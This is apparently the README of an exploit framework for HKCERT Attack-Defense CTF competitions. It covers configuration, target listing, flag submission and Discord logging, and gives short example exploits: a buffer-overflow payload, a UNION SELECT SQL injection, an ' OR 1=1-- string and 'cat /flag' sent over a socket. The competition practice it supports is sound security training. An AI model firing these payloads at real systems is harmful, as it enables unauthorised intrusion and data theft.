# AWD CTF Exploit Framework

A simple, batteries-included framework for Attack-Defense CTF competitions.

## Quick Start

```bash
# 1. Copy template for your exploit
cp template.py my_exploit.py

# 2. Edit my_exploit.py:
#    - Set PORT for the challenge
#    - Implement exploit() function

# 3. Run it
python3 my_exploit.py
```

## Installation

```bash
pip install pwntools requests
# Optional for xlsx support:
pip install openpyxl
```

## Configuration

### Option 1: Edit awd_lib.py directly

Edit the configuration section at the top of `awd_lib.py`:

```python
API_URL = "https://platform.ctf.hkcert.org/api/..."
TOKEN = "your_token_here"
CREDS_FILE = "mqda.csv"
PEM_URL = "http://10.30.16.251/..."
```

### Option 2: Use chal() function

```python
from awd_lib import chal

chal(
    creds_file="mqda.csv",
    api_url="https://...",
    token="your_token",
    discord_host="192.168.1.100",  # Optional
    discord_port=4545,
)
```

## Usage

### Running Exploits

```bash
# Attack all targets once
python3 my_exploit.py

# Attack specific IP
python3 my_exploit.py 172.24.84.11

# Run continuously (loop mode)
python3 my_exploit.py --loop

# Show competition info
python3 my_exploit.py --info

# List all targets
python3 my_exploit.py --targets

# Get SSH command for a target
python3 my_exploit.py --ssh 172.24.84.11
```

### Writing Exploits

The template provides a simple structure:

```python
def exploit(ip, port):
    """Return flag string if successful, None otherwise."""
    try:
        p = remote(ip, port)
        
        # Your exploit logic here
        p.sendline(b"cat /flag")
        flag = p.recvline().strip()
        
        p.close()
        return flag
    except:
        return None
```

## API Reference

### Core Functions

| Function | Description |
|----------|-------------|
| `setup_auth()` | Download PEM file and set correct permissions (600) |
| `targets()` | Get list of target IP addresses |
| `our_ip()` | Get our team's IP address |
| `submit(flag)` | Submit flag to scoring server |
| `ssh_command(ip)` | Get SSH command string for target |

### Discord Logging

```python
from awd_lib import discord

# Configure (optional)
discord.configure("192.168.1.100", 4545)

# Log messages
discord.info("Starting round")
discord.success("Got shell!", target=ip)
discord.error("Failed", exc=e)
discord.flag("Captured!", flag=flag, target=ip)
discord.attack("SQLi detected", payload="' OR 1=1--")
discord.pwned(ip, flag=flag)  # Convenience method
```

### Configuration Function

```python
chal(
    creds_file="mqda.csv",      # Path to credentials CSV/XLSX
    api_url="https://...",       # Flag submission API
    token="abc123",              # API token
    pem_url="http://...",        # PEM file download URL
    pem_file="auth.pem",         # Local PEM filename
    discord_host="192.168.1.1",  # Discord logger host
    discord_port=4545,           # Discord logger port
)
```

## File Format

### Credentials File (CSV)

The framework parses HKCERT-style credential files:

```csv
Login Info,
Name,Team_01
IP,172.24.84.10
SecretUrl,http://10.30.16.251/.../key.pem

Guest_Node,
Name,Team_02
IP,172.24.84.11

Guest_Node,
Name,Team_03
IP,172.24.84.12
```

## Examples

### Simple Binary Exploit

```python
def exploit(ip, port):
    try:
        p = remote(ip, port)
        
        # Buffer overflow
        payload = b"A" * 64
        payload += p64(0x401337)  # win function
        
        p.sendline(payload)
        p.recvuntil(b"flag{")
        flag = b"flag{" + p.recvuntil(b"}")
        
        p.close()
        return flag
    except:
        return None
```

### Web Exploit

```python
import requests

def exploit(ip, port):
    try:
        url = f"http://{ip}:{port}"
        
        # SQL injection
        r = requests.get(f"{url}/api?id=' UNION SELECT flag FROM flags--")
        
        if "flag{" in r.text:
            import re
            match = re.search(r'flag\{[^}]+\}', r.text)
            return match.group(0) if match else None
        return None
    except:
        return None
```

### With Discord Logging

```python
from awd_lib import discord

discord.configure("192.168.1.100", 4545)

def exploit(ip, port):
    try:
        p = remote(ip, port)
        # ... exploit logic ...
        flag = get_flag(p)
        
        if flag:
            discord.pwned(ip, flag=flag, exploit="bof_v1")
        return flag
    except Exception as e:
        discord.error(f"Failed on {ip}", exc=e)
        return None
```

## Tips

1. **Test single target first**: `python3 exploit.py 172.24.84.11`
2. **Check info before running**: `python3 exploit.py --info`
3. **Use loop mode during competition**: `python3 exploit.py --loop`
4. **Keep exploits simple**: One vulnerability per file
5. **Handle exceptions**: Always return `None` on failure, don't crash

## Troubleshooting

### "Permission denied" for PEM file
```bash
# The framework handles this automatically, but if needed:
chmod 600 auth.pem
```

### "Credentials file not found"
```bash
# Make sure mqda.csv is in the same directory
# Or configure the path:
chal(creds_file="/path/to/creds.csv")
```

### Discord not logging
```python
# Check if configured and enabled
print(discord)  # Shows status

# Test connection
discord.test()  # Returns True if reachable
```

## License

Internal use for HKCERT CTF competitions.
